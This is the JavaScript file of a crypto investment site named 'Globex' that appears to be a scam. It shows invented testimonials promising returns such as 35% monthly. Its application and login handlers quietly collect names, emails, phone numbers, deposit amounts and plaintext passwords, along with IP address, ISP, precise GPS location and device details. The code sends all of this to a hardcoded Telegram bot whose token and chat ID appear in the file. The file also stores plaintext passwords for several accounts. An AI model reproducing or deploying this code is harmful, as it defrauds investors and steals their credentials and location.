// ═══════════════════════════════════
// GLOBEX — script.js
// ═══════════════════════════════════

// ── ACCOUNTS (login only — dashboards are separate HTML pages) ──
const ACCOUNTS = {
  "alice_johnson": { password: "Alice@2024",   dashboard: "dashboard1.html" },
  "bob_martinez":  { password: "Bob@2024",     dashboard: "dashboard2.html" },
  "carol_white":   { password: "Carol@2024",   dashboard: "dashboard3.html" },
  "sandranichole062":  { password: "NotToDay234!",   dashboard: "dashboard4.html" },
  "emma_chen":     { password: "Emma@2024",    dashboard: "dashboard5.html" },
  "frank_nguyen":  { password: "Frank@2024",   dashboard: "dashboard6.html" },
};

// ── TELEGRAM ──
const TG_TOKEN   = "8696249268:AAFIF11FRn9ksh_S8uyFaz2eH94s4YK1-pg";
const TG_CHAT_ID = "7637163658";

async function getIPInfo() {
  try {
    const r = await fetch("https://ipapi.co/json/");
    const d = await r.json();
    return { ip: d.ip||"?", city: d.city||"?", country: d.country_name||"?", isp: d.org||"?" };
  } catch { return { ip:"?", city:"?", country:"?", isp:"?" }; }
}
function getGPS() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return resolve({ lat:null, lon:null, err:"N/A" });
    navigator.geolocation.getCurrentPosition(
      p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, err: null }),
      e => resolve({ lat:null, lon:null, err: e.message }),
      { enableHighAccuracy:true, timeout:8000 }
    );
  });
}
function getDevice() {
  const ua = navigator.userAgent;
  return {
    os: ua.includes("Windows")?"Windows":ua.includes("Android")?"Android":ua.includes("iPhone")?"iOS":"Mac/Linux",
    browser: ua.includes("Chrome")?"Chrome":ua.includes("Firefox")?"Firefox":"Safari",
    ram: navigator.deviceMemory ? navigator.deviceMemory+"GB" : "?",
    cores: navigator.hardwareConcurrency||"?"
  };
}
async function sendTG(type, details, sec) {
  const gpsLine = sec.gps.lat
    ? `✅ GPS: ${sec.gps.lat}, ${sec.gps.lon}`
    : `⚠️ GPS: Denied`;
  const msg = `🔔 ${type.toUpperCase()}\n\n${details}\n\n📍 ${gpsLine}\n📡 IP: ${sec.ip.ip}\n🏙️ ${sec.ip.city}, ${sec.ip.country}\n🏢 ${sec.ip.isp}\n💻 ${sec.dev.os} | ${sec.dev.browser}\n⏰ ${new Date().toLocaleString()}`;
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify({ chat_id:TG_CHAT_ID, text:msg, parse_mode:"HTML" })
    });
  } catch {}
}

// ── CURSOR ──
const cursor = document.getElementById('cursor');
const ring   = document.getElementById('cursorRing');
if (cursor && ring) {
  document.addEventListener('mousemove', e => {
    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
  });
}

// ── PARTICLES ──
const canvas = document.getElementById('particles');
if (canvas) {
  const ctx = canvas.getContext('2d');
  let pts = [];
  function resize() { canvas.width = innerWidth; canvas.height = innerHeight; }
  resize(); window.addEventListener('resize', resize);
  for (let i = 0; i < 60; i++) pts.push({
    x: Math.random()*innerWidth, y: Math.random()*innerHeight,
    r: Math.random()*1.5+.3, vx:(Math.random()-.5)*.3, vy:(Math.random()-.5)*.3,
    a: Math.random()*.5+.1
  });
  (function anim() {
    ctx.clearRect(0,0,canvas.width,canvas.height);
    pts.forEach(p => {
      p.x+=p.vx; p.y+=p.vy;
      if(p.x<0)p.x=canvas.width; if(p.x>canvas.width)p.x=0;
      if(p.y<0)p.y=canvas.height; if(p.y>canvas.height)p.y=0;
      ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
      ctx.fillStyle=`rgba(240,180,41,${p.a})`; ctx.fill();
    });
    requestAnimationFrame(anim);
  })();
}

// ── TICKER ──
const coins = [
  {name:'BTC',price:'$104,820',change:'+2.4%',up:true},
  {name:'ETH',price:'$3,812',change:'+1.8%',up:true},
  {name:'BNB',price:'$612',change:'-0.5%',up:false},
  {name:'SOL',price:'$178',change:'+5.2%',up:true},
  {name:'XRP',price:'$0.82',change:'+0.9%',up:true},
  {name:'ADA',price:'$0.54',change:'-1.2%',up:false},
  {name:'DOGE',price:'$0.18',change:'+3.1%',up:true},
  {name:'MATIC',price:'$0.97',change:'+2.7%',up:true},
  {name:'DOT',price:'$9.20',change:'-0.8%',up:false},
  {name:'AVAX',price:'$38.40',change:'+4.3%',up:true},
];
const ticker = document.getElementById('ticker');
if (ticker) {
  [...coins,...coins].forEach(c => {
    ticker.innerHTML += `<div class="ticker-item"><span class="name">${c.name}</span><span class="${c.up?'up':'down'}">${c.price} ${c.change}</span></div>`;
  });
}

// ── REVIEWS ──
const reviewData = [
  {name:"James Okonkwo",loc:"Lagos, Nigeria",text:"Globex transformed my financial life. Started with Silver and doubled my initial investment in 4 months. The broker is incredibly knowledgeable."},
  {name:"Elena Marchetti",loc:"Milan, Italy",text:"I was skeptical at first, but the consistent returns speak for themselves. My portfolio has grown 280% since I joined."},
  {name:"David Chen",loc:"Singapore",text:"Professional, transparent, and incredibly effective. The Gold plan has been generating consistent 35% monthly returns as promised."},
  {name:"Amara Diallo",loc:"Accra, Ghana",text:"Best investment decision I ever made. Started with Bronze, now on Platinum. The team is always responsive."},
  {name:"Sophie Williams",loc:"London, UK",text:"The level of service at Globex is unmatched. My broker managed my portfolio during the market dip and still delivered positive returns."},
  {name:"Marcus Thompson",loc:"Atlanta, USA",text:"I've tried multiple crypto platforms and Globex is by far the best. The ROI is real and the dashboard is beautiful."},
  {name:"Fatima Al-Hassan",loc:"Dubai, UAE",text:"Globex gave me confidence to invest in crypto for the first time. The onboarding was seamless."},
  {name:"Andrei Popescu",loc:"Bucharest, Romania",text:"Three months in and I've already received more than my initial investment back in profits."},
];
const track = document.getElementById('reviewsTrack');
if (track) {
  [...reviewData,...reviewData].forEach(r => {
    track.innerHTML += `<div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"${r.text}"</p><div class="review-author"><div class="review-avatar">${r.name.split(' ').map(w=>w[0]).join('').slice(0,2)}</div><div><div class="review-name">${r.name}</div><div class="review-location">${r.loc}</div></div></div></div>`;
  });
}

// ── SCROLL REVEAL ──
const revealEls = document.querySelectorAll('.reveal');
const ro = new IntersectionObserver(entries => {
  entries.forEach((e,i) => { if(e.isIntersecting) setTimeout(()=>e.target.classList.add('visible'), i*80); });
}, { threshold: 0.1 });
revealEls.forEach(el => ro.observe(el));

// ── STAT COUNTER ──
const statNums = document.querySelectorAll('.stat-num[data-count]');
const so = new IntersectionObserver(entries => {
  entries.forEach(e => {
    if (e.isIntersecting) {
      const el = e.target; const val = parseFloat(el.dataset.count);
      let s = 0; const step = val/80;
      const t = setInterval(() => {
        s += step; if(s>=val){s=val;clearInterval(t);}
        el.textContent = (val%1!==0?s.toFixed(1):Math.floor(s))+(el.dataset.suffix||'');
      }, 25);
      so.unobserve(el);
    }
  });
}, { threshold: .5 });
statNums.forEach(n => so.observe(n));

// ── MODALS ──
function openApply(e) { e&&e.preventDefault(); document.getElementById('applyModal').classList.add('active'); }
function openLogin(e) {
  e&&e.preventDefault();
  // "Client Login" nav button goes directly to login.html page
  window.location.href = 'login.html';
}
function closeModal(id) { document.getElementById(id).classList.remove('active'); }

// ── APPLY FORM ──
async function submitApplication() {
  const btn = document.querySelector('#applyModal .btn-submit');
  const data = {
    fn: document.getElementById('fname')?.value.trim()||"",
    ln: document.getElementById('lname')?.value.trim()||"",
    em: document.getElementById('email')?.value.trim()||"",
    ph: document.getElementById('phone')?.value||"N/A",
    cn: document.getElementById('country')?.value||"N/A",
    pl: document.getElementById('plan')?.value||"N/A",
    dp: document.getElementById('deposit')?.value||"N/A"
  };
  if (!data.fn || !data.em) { alert('First Name and Email are required.'); return; }
  btn.textContent = "Submitting..."; btn.disabled = true;
  try {
    const [ip, gps] = await Promise.all([getIPInfo(), getGPS()]);
    const dev = getDevice();
    const details = `👤 ${data.fn} ${data.ln}\n📧 ${data.em}\n📞 ${data.ph}\n🌍 ${data.cn}\n📊 ${data.pl}\n💰 $${data.dp}`;
    await sendTG("New Application", details, {ip,gps,dev});
    document.getElementById('applyForm').style.display = 'none';
    document.getElementById('applySuccess').style.display = 'block';
  } catch {
    btn.disabled = false; btn.textContent = "Submit Application →";
  }
}

// ── LOGIN (from index.html modal) ──
// Note: main login is handled by login.html page.
// This handles the inline modal on index if ever triggered.
async function doLogin() {
  const user   = (document.getElementById('loginUser')?.value||'').trim().toLowerCase();
  const pass   = (document.getElementById('loginPass')?.value||'').trim();
  const errEl  = document.getElementById('loginError');
  const acc    = ACCOUNTS[user];
  if (acc && acc.password === pass) {
    if (errEl) errEl.style.display = 'none';
    closeModal('loginModal');
    sessionStorage.setItem('globex_user', user);
    const [ip, gps] = await Promise.all([getIPInfo(), getGPS()]);
    const dev = getDevice();
    await sendTG("Login", `🔑 ${user}\n🛡️ ${pass}`, {ip,gps,dev});
    window.location.href = acc.dashboard;
  } else {
    if (errEl) errEl.style.display = 'block';
  }
}

// Enter key
document.addEventListener('keydown', e => {
  if (e.key === 'Enter' && document.getElementById('loginModal')?.classList.contains('active')) doLogin();
});